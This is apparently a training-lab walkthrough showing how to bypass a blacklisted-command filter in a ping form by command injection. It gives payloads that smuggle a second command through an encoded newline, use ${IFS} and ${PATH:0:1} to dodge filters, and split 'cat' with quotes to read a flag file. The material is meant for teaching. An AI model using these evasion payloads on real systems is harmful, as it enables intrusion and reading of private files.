---
description: >-
  Use what you learned in this section find the content of flag.txt in the home
  folder of the user you previously found.
---

# Bypassing Blacklisted Commands

We continue to build up on our command in order to bypass the blacklist.&#x20;

First lets list the files inside the user 1nj3c70r. We add `${PATH:0:1}1nj3c70r` to our command:

```bash
ip=127.0.0.1%0a{ls,-la}${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As we can see the `flag.txt` is indeed in the home folder.

Now all we have to to is retrieve the content from the file. To this we need to use the `cat` command.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Since some basic commands are in the blacklist, if we just insert cat we won't be able to use it in order the see the content of the `flag.txt`.

That's why we have to "break" the command with double-quotes in order to by pass the WAF:

{% code overflow="wrap" %}
```bash
ip=127.0.0.1%0ac"a"t${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```
{% endcode %}

The command will be interpreted like this:

```bash
ping -c 1 127.0.0.1; cat /home/1nj3c70r/flag.txt
```

